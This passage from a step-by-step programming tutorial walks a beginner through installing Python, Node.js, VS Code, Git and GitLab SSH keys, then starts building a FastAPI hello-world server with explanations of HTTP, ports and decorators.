### Stage 0: Absolute Beginner & Environment Setup

## Introduction: The Goal of This Stage

Before we can build a sophisticated web application, we need to prepare our workspace. Think of this like a carpenter setting up their workshop - you need the right tools, and you need to understand what each tool does and why you have it.

By the end of this stage, you will have:

- A working Python environment with package management
- A working JavaScript environment with Node.js
- A code editor configured for professional development
- Command-line skills to navigate and run programs
- Git installed and configured for version control
- A connection to GitLab for collaborative work

**Time Investment:** 2-4 hours (don't rush this - getting your environment right saves countless hours of frustration later)

---

## 0.1: Understanding Your Computer's Operating System

Before installing anything, you need to understand what operating system (OS) you're running. Your OS determines HOW you'll install tools and which commands you'll use.

### The Three Major Operating Systems

**1. Windows**

- Most common for personal computers
- Uses backslashes for file paths: `C:\Users\YourName\Documents`
- Package manager: `winget` (modern) or manual installers
- Terminal: PowerShell or Command Prompt

**2. macOS (Mac)**

- Based on Unix (like Linux)
- Uses forward slashes: `/Users/YourName/Documents`
- Package manager: Homebrew (we'll install this)
- Terminal: Terminal.app or iTerm2

**3. Linux**

- Many "distributions" (Ubuntu, Fedora, Arch, etc.)
- Uses forward slashes: `/home/yourname/documents`
- Package manager: depends on distribution (apt, dnf, pacman)
- Terminal: varies by distribution

### Check Your OS Version

**Windows:**

1. Press `Windows Key + R`
2. Type `winver` and press Enter
3. Note your version (Windows 10 or 11 recommended)

**macOS:**

1. Click Apple menu → "About This Mac"
2. Note your version (macOS 11+ recommended)

**Linux:**

```bash
cat /etc/os-release
```

**Why This Matters:** Different OS versions have different default paths, different ways to install software, and different commands. The tutorial will provide OS-specific instructions when needed.

---

## 0.2: Installing Python

### What is Python?

Python is a **programming language**. It's the language we'll use to write our backend server code. Think of it like learning Spanish or French - it's a way to communicate instructions to the computer.

**Why Python for our backend?**

- Readable syntax that resembles plain English
- Massive ecosystem of libraries for web development
- FastAPI (our chosen framework) is one of the fastest, most modern web frameworks available
- Used by companies like Instagram, Spotify, Netflix, and NASA

### The Python Interpreter

When you "install Python," you're installing an **interpreter** - a program that reads your Python code and executes it line by line.

**The Computer Science Behind It:**

- Your Python code is **source code** (human-readable text)
- The interpreter converts it into **bytecode** (a lower-level representation)
- The Python Virtual Machine (PVM) executes the bytecode
- This is different from compiled languages like C, where the entire program is converted to machine code before running

### Installation Steps

**Windows:**

1. Go to [python.org/downloads](https://www.python.org/downloads/)
2. Download Python 3.11 or 3.12 (NOT 3.13 yet - some libraries aren't compatible)
3. Run the installer
4. **CRITICAL:** Check "Add Python to PATH" before clicking Install
5. Verify installation:

   ```powershell
   python --version
   ```

**macOS:**

```bash
### First, install Homebrew (the Mac package manager)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

### Then install Python
brew install python@3.11

### Verify
python3 --version
```

**Linux (Ubuntu/Debian):**

```bash
sudo apt update
sudo apt install python3.11 python3.11-venv python3-pip
python3 --version
```

### Understanding `pip` - The Python Package Manager

When you installed Python, you also got `pip` (Pip Installs Packages). This is how you'll install third-party libraries.

**Verify pip installation:**

```bash
pip --version
### or on Mac/Linux:
pip3 --version
```

**The Analogy:** Think of `pip` like an app store for code. Instead of manually downloading libraries, you can type `pip install fastapi` and it automatically downloads FastAPI and all its dependencies.

---

## 0.3: Installing Node.js

### What is Node.js?

Node.js is **JavaScript running outside the browser**. Traditionally, JavaScript only ran in web browsers. Node.js is a runtime environment that allows JavaScript to run on servers, in terminals, and for build tools.

**Why do we need it?**

- We'll write frontend JavaScript that runs in the browser
- But we need Node.js for development tools (linters, build tools, package management)
- `npm` (Node Package Manager) comes with Node.js and manages JavaScript libraries

### Installation Steps

**All Operating Systems:**

1. Go to [nodejs.org](https://nodejs.org/)
2. Download the **LTS (Long Term Support)** version (currently 20.x or 22.x)
3. Run the installer (accept all defaults)
4. Verify installation:

   ```bash
   node --version
   npm --version
   ```

**What Just Happened?**
You now have two commands available:

- `node` - Runs JavaScript files: `node myfile.js`
- `npm` - Manages JavaScript packages: `npm install axios`

### Quick Test

Create a file `test.js`:

```javascript
console.log("Hello from Node.js!");
console.log("2 + 2 =", 2 + 2);
```

Run it:

```bash
node test.js
```

You should see:

```
Hello from Node.js!
2 + 2 = 4
```

**What's Happening:** Node.js read your file, executed the JavaScript, and printed the output to your terminal. This is the same JavaScript engine (V8) that powers Google Chrome.

---

## 0.4: Your Code Editor - Visual Studio Code

### Why Not Notepad or Word?

A **code editor** is designed specifically for writing code. It provides:

- **Syntax highlighting** - different colors for different parts of code
- **Auto-completion** - suggests code as you type
- **Error detection** - highlights mistakes before you run the code
- **Integrated terminal** - run commands without leaving the editor

### Installing VS Code

1. Go to [code.visualstudio.com](https://code.visualstudio.com/)
2. Download for your OS
3. Install (accept defaults)
4. Launch VS Code

### Essential Extensions

Click the Extensions icon (four squares) on the left sidebar and install:

1. **Python** (by Microsoft)
   - Provides Python IntelliSense, linting, debugging
2. **Pylance** (by Microsoft)
   - Advanced Python language support
3. **JavaScript (ES6) code snippets** (by charalampos karypidis)

   - Shortcuts for common JavaScript patterns

4. **GitLens** (by GitKraken)

   - Shows who changed what line of code and when

5. **Better Comments** (by Aaron Bond)
   - Makes comments more readable with color coding

### Configuring VS Code

Open Settings (Gear icon → Settings or `Ctrl+,`) and set:

- **Auto Save**: `onFocusChange` - automatically saves when you switch files
- **Format On Save**: Enabled - automatically formats code when saving
- **Tab Size**: 4 for Python, 2 for JavaScript (VS Code does this automatically)

### Creating Your Project Folder

1. Create a folder: `pdm-tutorial`
2. In VS Code: File → Open Folder → Select `pdm-tutorial`
3. This is your **workspace** - all tutorial files will go here

---

## 0.5: The Terminal/Command Line

### What is the Terminal?

The **terminal** (also called command line, shell, or console) is a text-based interface to your computer. Before graphical user interfaces (GUIs) with windows and icons, this was the ONLY way to use a computer.

**Why learn it?**

- Essential for running servers and development tools
- Faster than clicking through menus once you learn it
- Many professional tools are command-line only
- Required for working with Git, Docker, cloud services

### Opening Your Terminal

**Windows:**

- VS Code: View → Terminal (or `` Ctrl+` ``)
- Or: Start Menu → type "PowerShell"

**macOS:**

- VS Code: View → Terminal (or `` Ctrl+` ``)
- Or: Applications → Utilities → Terminal

**Linux:**

- Usually `Ctrl+Alt+T`

### Essential Commands

#### Navigation

**`pwd`** (Print Working Directory) - Where am I?

```bash
pwd
### Output: /Users/yourname/pdm-tutorial
```

**`ls`** (List) - What's in this folder? (Windows: `dir`)

```bash
ls
### Shows all files and folders in current directory
```

**`cd`** (Change Directory) - Move to a different folder

```bash
cd Documents           # Move into Documents folder
cd ..                  # Move up one level
cd ~                   # Move to home directory
cd /path/to/folder     # Move to specific path
```

#### File Operations

**`mkdir`** (Make Directory) - Create a folder

```bash
mkdir backend
mkdir frontend
```

**`touch`** - Create an empty file (Windows: `New-Item`)

```bash
touch main.py          # Creates main.py
### Windows:
New-Item main.py
```

**`cat`** - View file contents (Windows: `type`)

```bash
cat main.py
### Windows:
type main.py
```

**`rm`** - Remove file (CAREFUL - no undo!)

```bash
rm old_file.py
```

### The PATH Environment Variable

When you type `python` in the terminal, how does your computer know where to find the Python program?

**The Answer:** The `PATH` variable.

**Deep Dive:**

- `PATH` is a list of directories your OS searches when you type a command
- When you type `python`, the OS looks in each PATH directory for a file named `python` (or `python.exe` on Windows)
- The first match it finds is what gets executed

**View your PATH:**

```bash
### macOS/Linux:
echo $PATH

### Windows PowerShell:
$env:PATH
```

You'll see something like:

```
/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
```

These are directories separated by `:` (or `;` on Windows).

**Why "Add Python to PATH" was critical:**

- Without it, typing `python` would result in "command not found"
- You'd have to type the full path every time: `C:\Python311\python.exe`

---

## 0.6: Hello World in Python

Let's write your first Python program.

### Create the File

In your `pdm-tutorial` folder:

```bash
touch hello.py
```

Open `hello.py` in VS Code and type:

```python
### This is a comment - Python ignores it
### Comments explain what the code does

print("Hello, World!")
print("Welcome to PDM Development")

### Variables - boxes that store data
name = "Your Name"
print("My name is:", name)

### Simple math
x = 10
y = 20
print(f"{x} + {y} = {x + y}")
```

### Run It

In the terminal:

```bash
python hello.py
```

**Expected Output:**

```
Hello, World!
Welcome to PDM Development
My name is: Your Name
10 + 20 = 30
```

### Understanding What Happened

1. **The Python Interpreter** read your file line-by-line
2. **`print()`** is a built-in function that outputs text
3. **Variables** (`name`, `x`, `y`) store data in memory
4. **f-strings** (`f"..."`) let you insert variables into text
5. The program ran and exited

**The Computer Science:**

- Your source code is in a `.py` file (plain text)
- Python compiles it to bytecode (stored in `__pycache__` folder)
- The bytecode is executed by the Python Virtual Machine
- Output is sent to stdout (standard output - your terminal)

### Experiment

Try changing the code:

```python
### What happens with different data types?
age = 25                    # Integer (whole number)
price = 19.99              # Float (decimal)
is_student = True          # Boolean (True/False)
items = ["apple", "banana"] # List (collection)

print(f"Age: {age}, Type: {type(age)}")
print(f"Price: ${price}, Type: {type(price)}")
print(f"Student: {is_student}, Type: {type(is_student)}")
print(f"Items: {items}, Type: {type(items)}")
```

Run it and observe the output. You're learning Python's **type system**.

---

## 0.7: Hello World in JavaScript

### Create the File

```bash
touch hello.js
```

Open `hello.js`:

```javascript
// This is a comment in JavaScript
// JavaScript uses // for single-line comments

console.log("Hello, World!");
console.log("JavaScript running in Node.js");

// Variables in JavaScript
const name = "Your Name"; // const = constant (can't be changed)
let age = 25; // let = variable (can be changed)

console.log("Name:", name);
console.log("Age:", age);

// Simple math
let x = 10;
let y = 20;
console.log(`${x} + ${y} = ${x + y}`); // Template literals use backticks

// Arrays (lists)
const colors = ["red", "green", "blue"];
console.log("Colors:", colors);

// Objects (like Python dictionaries)
const person = {
  firstName: "John",
  lastName: "Doe",
  age: 30,
};
console.log("Person:", person);
```

### Run It

```bash
node hello.js
```

### Python vs JavaScript - Key Differences

| Aspect               | Python                        | JavaScript                                     |
| -------------------- | ----------------------------- | ---------------------------------------------- |
| Comments             | `#`                           | `//` or `/* */`                                |
| Variables            | `name = "value"`              | `const name = "value"` or `let name = "value"` |
| String formatting    | `f"{var}"`                    | `` `${var}` ``                                 |
| Print output         | `print()`                     | `console.log()`                                |
| Lists/Arrays         | `[1, 2, 3]`                   | `[1, 2, 3]` (same syntax!)                     |
| Dictionaries/Objects | `{"key": "value"}`            | `{key: "value"}` (no quotes on keys)           |
| Indentation          | **Required** (defines blocks) | Optional (uses `{}` for blocks)                |

---

## 0.8: Virtual Environments - The Deep Dive

### The Problem

Imagine you're working on three Python projects:

- **Project A** needs Django version 3.2
- **Project B** needs Django version 4.0
- **Project C** doesn't use Django at all

If you install Django globally (for your entire system), you can only have ONE version. Projects will break.

### The Solution: Virtual Environments

A **virtual environment** (venv) is an isolated Python installation for ONE project.

**The Analogy:** Think of your system Python as a shared kitchen. Everyone uses it, and if someone makes a mess, it affects everyone. A virtual environment is giving each project its own private kitchen.

### How It Works (Under the Hood)

When you create a venv:

1. Python creates a folder (usually named `venv`) in your project
2. Inside, it creates a copy of the Python interpreter
3. It creates a `site-packages` folder for this project's libraries
4. It modifies your `PATH` when activated to prioritize this Python

### Creating a Virtual Environment

In your `pdm-tutorial` folder:

```bash
### Create the venv
python -m venv venv

### Activate it
### Windows PowerShell:
venv\Scripts\Activate.ps1

### macOS/Linux:
source venv/bin/activate
```

**You'll see `(venv)` appear in your terminal prompt.**

This means: "You are now using the isolated Python environment for this project."

### The sys.path Exercise

Let's SEE what the venv does.

**BEFORE activating venv:**

```bash
### Make sure venv is NOT activated
python -c "import sys; print('\n'.join(sys.path))"
```

You'll see system-wide Python directories.

**AFTER activating venv:**

```bash
### Now activate
source venv/bin/activate  # or venv\Scripts\Activate.ps1 on Windows

python -c "import sys; print('\n'.join(sys.path))"
```

**Notice the difference:** The FIRST path is now `.../pdm-tutorial/venv/lib/python3.11/site-packages`

**What This Means:**

- When you `import fastapi`, Python searches directories in order
- With venv activated, it finds your project's isolated copy FIRST
- System libraries are still accessible as a fallback

### Installing Packages in the venv

```bash
### Make sure venv is activated (you see (venv) in prompt)
pip install requests

### Check what's installed
pip list
```

You'll see a SHORT list - just what YOU installed.

**Deactivate the venv:**

```bash
deactivate
```

**Check again:**

```bash
pip list
```

You'll see your SYSTEM-WIDE packages - a much longer list.

**The Power:** Each project has its own dependencies. No conflicts, ever.

### The Dependency Graph

Let's visualize the tree of dependencies.

```bash
### Activate venv
source venv/bin/activate

### Install the visualization tool
pip install pipdeptree

### Run it
pipdeptree
```

**Output example:**

```
requests==2.31.0
├── certifi [required: >=2017.4.17, installed: 2023.7.22]
├── charset-normalizer [required: >=2.0.0,<4, installed: 3.2.0]
├── idna [required: >=2.5,<4, installed: 3.4]
└── urllib3 [required: >=1.21.1,<3, installed: 2.0.4]
```

**What This Shows:**

- You installed ONE package (`requests`)
- But it DEPENDS on four other packages
- `pip` automatically installed all of them
- This tree can get VERY deep for complex frameworks

**The Lesson:** Modern software is built on layers of dependencies. Understanding this graph is crucial for debugging version conflicts.

---

## 0.9: Version Control with Git

### What is Version Control?

**The Problem Without It:**

- You make changes to your code
- Something breaks
- You can't remember what you changed
- You have no "undo" button
- You're working with a teammate - how do you merge your changes?

**The Solution:**
Git is a **Distributed Version Control System (DVCS)**. It:

- Tracks every change to your files
- Lets you "rewind" to any previous state
- Enables multiple people to work on the same code
- Shows you exactly who changed what and why

### Installing Git

**Windows:**

- Download from [git-scm.com](https://git-scm.com/)
- Run installer (accept defaults)

**macOS:**

```bash
brew install git
```

**Linux:**

```bash
sudo apt install git  # Ubuntu/Debian
```

**Verify:**

```bash
git --version
```

### Configuring Git (IMPORTANT - Do This Once)

```bash
git config --global user.name "Your Name"
git config --global user.email "your.email@example.com"
```

**Why This Matters:** Every Git commit records who made it. This information is stored forever in the project's history.

### Your First Repository

A **repository** (repo) is a project tracked by Git.

```bash
### In your pdm-tutorial folder
git init
```

**What happened?**

```bash
ls -la  # macOS/Linux
dir /a  # Windows
```

You'll see a hidden `.git` folder. This IS the repository - it contains the entire history of your project.

**Warning:** NEVER delete the `.git` folder unless you want to lose all history.

### The Three-Stage Architecture

Git has three conceptual "areas":

1. **Working Directory** - Your actual files (the messy workbench)
2. **Staging Area (Index)** - Changes ready to be saved (the clean photo table)
3. **Repository (.git folder)** - Permanent saved snapshots (the photo album)

### Making Your First Commit

**Step 1: Create a file to track**

```bash
echo "# PDM Tutorial" > README.md
```

**Step 2: Check status**

```bash
git status
```

Output:

```
Untracked files:
  README.md
```

Git sees the file but isn't tracking it yet.

**Step 3: Stage the file**

```bash
git add README.md
```

**Check status again:**

```bash
git status
```

Output:

```
Changes to be committed:
  new file: README.md
```

The file is now in the staging area.

**Step 4: Commit (save the snapshot)**

```bash
git commit -m "Initial commit: Add README"
```

The `-m` flag adds a message explaining WHAT you changed and WHY.

### Viewing History

```bash
git log
```

You'll see:

```
commit a3f5c9b... (HEAD -> main)
Author: Your Name <your.email@example.com>
Date:   Fri Oct 03 2025

    Initial commit: Add README
```

**What's a commit hash?** That `a3f5c9b...` is a SHA-1 hash (40 characters). It's a unique identifier for this snapshot. You can use it to reference this exact version of the code forever.

### Essential Git Commands Summary

```bash
git init                    # Create a new repository
git status                  # See what's changed
git add <file>              # Stage a file
git add .                   # Stage all changed files
git commit -m "message"     # Save a snapshot
git log                     # View history
git diff                    # See unstaged changes
git diff --staged           # See staged changes
```

---

## 0.10: Connecting to GitLab

### What is GitLab?

**Git** is the tool on your computer.  
**GitLab** is a website/server that hosts Git repositories.

**The Analogy:**

- Git = A diary you keep on your desk
- GitLab = A secure vault where you store a copy of your diary

**Why Use GitLab?**

- **Backup** - Your code is safe even if your computer dies
- **Collaboration** - Multiple people can work on the same project
- **Deployment** - Many hosting services (like Heroku) deploy directly from GitLab
- **CI/CD** - Automatically test and deploy your code

**Alternatives:** GitHub, Bitbucket (all use Git, just different hosting companies)

### Creating a GitLab Account

1. Go to [gitlab.com](https://gitlab.com)
2. Sign up (free tier is generous)
3. Verify your email
4. You're ready

### SSH Keys - Secure Authentication

When you push code to GitLab, it needs to verify you're YOU. You could type your password every time, but there's a better way: **SSH keys**.

**How SSH Keys Work:**

1. You generate two files: a **private key** (stays on your computer) and a **public key** (goes to GitLab)
2. GitLab uses the public key to create a challenge
3. Your private key proves you can solve the challenge
4. This is **cryptographically secure** and more convenient than passwords

### Generating SSH Keys

```bash
### Check if you already have keys
ls -la ~/.ssh

### If you don't see id_rsa and id_rsa.pub, generate them:
ssh-keygen -t rsa -b 4096 -C "your.email@example.com"

### Press Enter for all prompts (accept defaults)
```

**What You Created:**

- `~/.ssh/id_rsa` - Your **private key** (NEVER share this)
- `~/.ssh/id_rsa.pub` - Your **public key** (safe to share)

### Adding Your Public Key to GitLab

1. Display your public key:

```bash
cat ~/.ssh/id_rsa.pub
```

2. Copy the entire output (starts with `ssh-rsa`)

3. In GitLab:
   - Click your avatar → Settings
   - SSH Keys (left sidebar)
   - Paste the key
   - Give it a title (like "My Laptop")
   - Click "Add key"

### Test the Connection

```bash
ssh -T git@gitlab.com
```

If successful:

```
Welcome to GitLab, @yourusername!
```

### Creating a Repository on GitLab

1. In GitLab, click "New project"
2. Choose "Create blank project"
3. Name: `pdm-tutorial`
4. Visibility: Private (for now)
5. **UNCHECK** "Initialize repository with a README" (we already have one locally)
6. Click "Create project"

### Connecting Your Local Repo to GitLab

GitLab will show you a command like this:

```bash
git remote add origin git@gitlab.com:yourusername/pdm-tutorial.git
```

This tells Git: "The remote server (called 'origin') is at this URL."

### Pushing Your Code

```bash
### Push your main branch to GitLab
git push -u origin main
```

The `-u` flag sets up tracking. Future pushes can just be `git push`.

**Refresh GitLab in your browser** - you'll see your README.md file!

### The Workflow (This is What You'll Do Daily)

```bash
### 1. Make changes to files
echo "New content" >> README.md

### 2. Stage changes
git add README.md

### 3. Commit
git commit -m "Update README with new content"

### 4. Push to GitLab
git push
```

That's it. You've backed up your work and made it available to collaborators.

---

## Stage 0 Complete - Verification Checklist

Before moving to Stage 1, verify you have:

- [ ] Python 3.11+ installed (`python --version`)
- [ ] pip working (`pip --version`)
- [ ] Node.js installed (`node --version`)
- [ ] npm working (`npm --version`)
- [ ] VS Code installed with Python extension
- [ ] Terminal basics mastered (cd, ls, mkdir)
- [ ] Virtual environment created and activated
- [ ] Git installed and configured
- [ ] GitLab account created
- [ ] SSH key added to GitLab
- [ ] Test repository pushed to GitLab

### Troubleshooting Common Issues

**"python: command not found"**

- Python isn't in your PATH
- Try `python3` instead (macOS/Linux)
- Reinstall Python with "Add to PATH" checked

**"Permission denied (SSH)"**

- SSH key not added to GitLab correctly
- Run `ssh -T git@gitlab.com` to test

**"pip install" is slow**

- Normal on first install (downloads packages)
- Future installs will be cached

---

Stage 0 was about preparation. You now have:

- A proper development environment
- Version control for tracking changes
- The foundational tools every developer uses

**In Stage 1**, we'll write our first FastAPI application. We'll start with a single endpoint that returns "Hello World" and understand every line of code that makes it work.

Take a break, experiment with the commands you've learned, and when you're ready, we'll start building the PDM application.

---

**Copy this entire section into your MkDocs. When you're ready, I'll give you Stage 1.**

### Stage 1: First Backend - FastAPI Hello World

## Introduction: The Goal of This Stage

You're about to write your first web server. By the end of this stage, you will:

- Understand what a web server actually IS
- Create a FastAPI application from absolute scratch
- Learn async/await in Python (the key to FastAPI's speed)
- Serve JSON data through API endpoints
- Implement basic error handling and logging
- Write your first automated tests

**Time Investment:** 3-5 hours

---

## 1.1: What is a Web Server? The Restaurant Analogy

### The Client-Server Model

Before writing any code, you need to understand the fundamental architecture of the web.

**The Two Roles:**

1. **Client** - Makes requests (your web browser, mobile app)
2. **Server** - Fulfills requests (your FastAPI application)

**The Restaurant Analogy:**

| Restaurant | Web Application            |
| ---------- | -------------------------- |
| Customer   | Client (browser)           |
| Waiter     | HTTP Protocol              |
| Menu       | Available endpoints (URLs) |
| Kitchen    | Your FastAPI code          |
| Food       | JSON data response         |

**The Flow:**

1. Customer looks at menu and orders "burger"
2. Waiter writes down order and brings it to kitchen
3. Kitchen prepares burger
4. Waiter delivers burger to customer
5. Customer enjoys burger

**Translated to Web:**

1. Browser looks at your site and requests `GET /api/files`
2. HTTP protocol carries the request to your server
3. FastAPI code processes the request
4. FastAPI returns JSON data
5. Browser displays the data

### HTTP: The Language of the Web

**HTTP (HyperText Transfer Protocol)** is how clients and servers communicate. It's a text-based protocol - you can literally read it.

**An HTTP Request looks like this:**

```
GET /api/files HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0
Accept: application/json
```

**An HTTP Response looks like this:**

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 47

{"files": ["file1.mcam", "file2.mcam"]}
```

We'll see this in action shortly.

### Why FastAPI?

**The Python Web Framework Landscape:**

- **Django** - The "batteries included" framework. Opinionated, comes with everything (ORM, admin panel, auth). Great for traditional web apps. Slower than FastAPI.
- **Flask** - Minimal, flexible. You add what you need. Synchronous (not async). Been around since 2010.
- **FastAPI** - Modern, fast, built on async. Automatic API documentation. Type hints for validation. Released 2018.

**We chose FastAPI because:**

- **Performance** - One of the fastest Python frameworks (comparable to Node.js)
- **Modern Python** - Uses type hints, async/await (Python 3.6+ features)
- **Auto Documentation** - Generates interactive API docs automatically
- **Data Validation** - Pydantic integration catches errors before they happen
- **Production Ready** - Used by Microsoft, Uber, Netflix

---

## 1.2: Installing FastAPI and Understanding Dependencies

### Activate Your Virtual Environment

**ALWAYS do this first when working on this project:**

```bash
### In your pdm-tutorial folder
source venv/bin/activate  # macOS/Linux
### or
venv\Scripts\Activate.ps1  # Windows
```

You should see `(venv)` in your terminal prompt.

### Installing FastAPI

```bash
pip install "fastapi[all]"
```

**What just happened?**

The `[all]` extra installs additional dependencies. Let's see what we got:

```bash
pip list | grep -i fastapi  # macOS/Linux
pip list | findstr fastapi  # Windows
```

You'll see:

- `fastapi` - The framework itself
- `uvicorn` - The ASGI server (runs your app)
- `starlette` - FastAPI is built on top of this
- `pydantic` - Data validation
- And more...

### Understanding the Dependency Tree

```bash
pip install pipdeptree
pipdeptree -p fastapi
```

**Output (simplified):**

```
fastapi==0.104.1
├── pydantic [required: >=1.7.4, installed: 2.4.2]
│   ├── annotated-types [required: >=0.4.0]
│   ├── pydantic-core [required: ==2.10.1]
│   └── typing-extensions [required: >=4.6.1]
├── starlette [required: <0.28.0, installed: 0.27.0]
│   └── anyio [required: >=3.4.0, <5]
└── typing-extensions [required: >=4.5.0]
```

**What This Shows:**

- FastAPI depends on 3 direct packages
- Those packages have their own dependencies
- Total: ~15-20 packages installed
- `pip` resolved all version constraints automatically

**The Lesson:** Modern software is built on layers of abstractions. You're not reinventing HTTP - you're using battle-tested libraries.

---

## 1.3: Your First FastAPI Application

### Create the File Structure

```bash
### Make sure you're in pdm-tutorial folder
mkdir backend
cd backend
touch main.py
```

### The Simplest Possible Server

Open `backend/main.py` and type this:

```python
from fastapi import FastAPI

app = FastAPI()

@app.get("/")
def read_root():
    return {"message": "Hello World"}
```

That's it. This is a complete web server.

### Understanding Every Line

**Line 1: `from fastapi import FastAPI`**

- `from` - We're importing FROM a package
- `fastapi` - The package we installed
- `import FastAPI` - We want the `FastAPI` class specifically
- **Why not `import fastapi`?** We could, but then we'd write `fastapi.FastAPI()`. This is cleaner.

**Line 3: `app = FastAPI()`**

- `app` - A variable name (you could call it anything, but `app` is convention)
- `FastAPI()` - Creates an instance of the FastAPI class
- **What's an instance?** The class is the blueprint; the instance is the actual building. `FastAPI` is the concept of a web framework; `app` is YOUR specific application.

**Line 5: `@app.get("/")`**

- `@` - This is a **decorator** (we'll explain shortly)
- `app.get` - Registers a GET endpoint
- `"/"` - The URL path (root of the website)
- **Translation:** "When someone makes a GET request to `/`, run the function below"

**Line 6: `def read_root():`**

- A normal Python function
- The name doesn't matter to FastAPI (use descriptive names)
- **No parameters** - This simple endpoint doesn't need any

**Line 7: `return {"message": "Hello World"}`**

- Returns a Python dictionary
- FastAPI **automatically converts** this to JSON
- You NEVER manually convert to JSON (FastAPI does it)

### Python Decorators - A Deep Dive

**The Concept:** A decorator is a function that modifies another function.

**Without Decorators (the manual way):**

```python
def read_root():
    return {"message": "Hello World"}

### Manually register the route
app.add_route("/", read_root, methods=["GET"])
```

**With Decorators (the clean way):**

```python
@app.get("/")
def read_root():
    return {"message": "Hello World"}
```

**What's Happening Behind the Scenes:**

1. Python sees the `@app.get("/")` decorator
2. It calls `app.get("/")` which returns a decorator function
3. That decorator function wraps your `read_root` function
4. Now `read_root` is registered as the handler for `GET /`

**The Analogy:** Think of a decorator like gift wrapping. The present (your function) is the same, but the wrapper (the decorator) adds extra functionality (routing, logging, authentication, etc.).

**Playground Exercise - Understanding Decorators:**

Create `test_decorators.py`:

```python
### A simple decorator that prints before and after
def logger(func):
    def wrapper(*args, **kwargs):
        print(f"BEFORE calling {func.__name__}")
        result = func(*args, **kwargs)
        print(f"AFTER calling {func.__name__}")
        return result
    return wrapper

### Using the decorator
@logger
def greet(name):
    print(f"Hello, {name}!")
    return f"Greeted {name}"

### Call it
result = greet("Alice")
print(f"Result: {result}")
```

Run it:

```bash
python test_decorators.py
```

**Output:**

```
BEFORE calling greet
Hello, Alice!
AFTER calling greet
Result: Greeted Alice
```

**The Power:** The `greet` function doesn't know it's being logged. The decorator added functionality WITHOUT changing the original function. This is the "separation of concerns" principle.

---

## 1.4: Running the Server with Uvicorn

### What is Uvicorn?

**Uvicorn** is an **ASGI server**. Let's break that down:

- **ASGI** = Asynchronous Server Gateway Interface
- **Server** = A program that listens for HTTP requests
- **Gateway** = Connects the HTTP world to your Python code
- **Interface** = A standard way for servers to talk to frameworks

**The Analogy:** FastAPI is the restaurant kitchen. Uvicorn is the building that houses it - the utilities, the doors, the infrastructure.

### Starting the Server

In your terminal (with venv activated):

```bash
cd backend  # If not already there
uvicorn main:app --reload
```

**Breaking Down the Command:**

- `uvicorn` - The server program
- `main` - The Python file (main.py)
- `app` - The variable name inside main.py
- `--reload` - Automatically restart when code changes (DEVELOPMENT ONLY)

**Expected Output:**

```
INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
INFO:     Started reloader process
INFO:     Started server process
INFO:     Waiting for application startup.
INFO:     Application startup complete.
```

**Your server is running!**

### Understanding the Address

`http://127.0.0.1:8000`

- **`http://`** - The protocol
- **`127.0.0.1`** - The IP address (localhost - your computer)
- **`8000`** - The port number

**What's a Port?**

Your computer has ONE IP address but can run MANY servers. Ports are like apartment numbers:

- Building address: `127.0.0.1`
- Apartment 8000: Your FastAPI app
- Apartment 3000: Maybe a React app
- Apartment 5432: Maybe a PostgreSQL database

**Why 8000?** Just convention. You could use any port above 1024 that's not already in use.

### Testing Your Server

**Method 1: Browser**

- Open `http://127.0.0.1:8000` in your browser
- You should see: `{"message":"Hello World"}`

**Method 2: curl (Command Line)**

Open a **NEW terminal window** (keep the server running in the first):

```bash
curl http://127.0.0.1:8000
```

**Output:**

```json
{ "message": "Hello World" }
```

**Method 3: Python Requests**

Create `test_client.py`:

```python
import requests

response = requests.get("http://127.0.0.1:8000")
print(f"Status Code: {response.status_code}")
print(f"Content: {response.json()}")
```

Run it:

```bash
pip install requests
python test_client.py
```

**Output:**

```
Status Code: 200
Content: {'message': 'Hello World'}
```

---

## 1.5: The Raw HTTP - Using curl Verbose Mode

Let's see the ACTUAL HTTP traffic.

```bash
curl -v http://127.0.0.1:8000
```

**Output (annotated):**

```
* Trying 127.0.0.1:8000...           # Connecting to server
* Connected to 127.0.0.1             # Connection established

> GET / HTTP/1.1                     # REQUEST LINE
> Host: 127.0.0.1:8000              # REQUEST HEADERS
> User-Agent: curl/7.79.1
> Accept: */*
>                                    # Blank line = end of headers

< HTTP/1.1 200 OK                    # RESPONSE STATUS LINE
< date: Fri, 03 Oct 2025 20:30:00 GMT   # RESPONSE HEADERS
< server: uvicorn
< content-length: 25
< content-type: application/json
<                                    # Blank line = end of headers

{"message":"Hello World"}            # RESPONSE BODY
```

**Lines starting with `>` = What you sent**  
**Lines starting with `<` = What the server sent back**

**This is the actual text** being transmitted over the network. HTTP is human-readable!

### HTTP Status Codes

The `200` in `HTTP/1.1 200 OK` is a status code. Essential ones:

| Code | Meaning      | Example                       |
| ---- | ------------ | ----------------------------- |
| 200  | OK           | Request succeeded             |
| 201  | Created      | New resource created (POST)   |
| 400  | Bad Request  | Client sent invalid data      |
| 401  | Unauthorized | Authentication required       |
| 403  | Forbidden    | Authenticated but not allowed |
| 404  | Not Found    | Resource doesn't exist        |
| 500  | Server Error | Something broke on server     |

**Try getting a 404:**

```bash
curl -v http://127.0.0.1:8000/nonexistent
```

You'll see:

```
< HTTP/1.1 404 Not Found
```

FastAPI automatically returns 404 for undefined routes.

---

## 1.6: Adding More Endpoints

### The Four HTTP Methods (CRUD)

| HTTP Method | Purpose        | SQL Equivalent | Example              |
| ----------- | -------------- | -------------- | -------------------- |
| GET         | Read data      | SELECT         | Get list of files    |
| POST        | Create data    | INSERT         | Upload a new file    |
| PUT         | Update/Replace | UPDATE         | Replace file content |
| DELETE      | Delete data    | DELETE         | Remove a file        |

### Adding a New Endpoint

Update `main.py`:

```python
from fastapi import FastAPI

app = FastAPI()

@app.get("/")
def read_root():
    return {"message": "Hello from the PDM Backend!"}

@app.get("/api/files")
def get_files():
    # Hardcoded for now - we'll make this real later
    files = [
        {"name": "PN1001_OP1.mcam", "status": "available"},
        {"name": "PN1002_OP1.mcam", "status": "checked_out"},
        {"name": "PN1003_OP1.mcam", "status": "available"}
    ]
    return {"files": files}
```

**Save the file.** With `--reload`, Uvicorn automatically restarts.

Check the terminal:

```
INFO:     Application startup complete.
```

### Test the New Endpoint

```bash
curl http://127.0.0.1:8000/api/files
```

**Output (pretty-printed):**

```json
{
  "files": [
    { "name": "PN1001_OP1.mcam", "status": "available" },
    { "name": "PN1002_OP1.mcam", "status": "checked_out" },
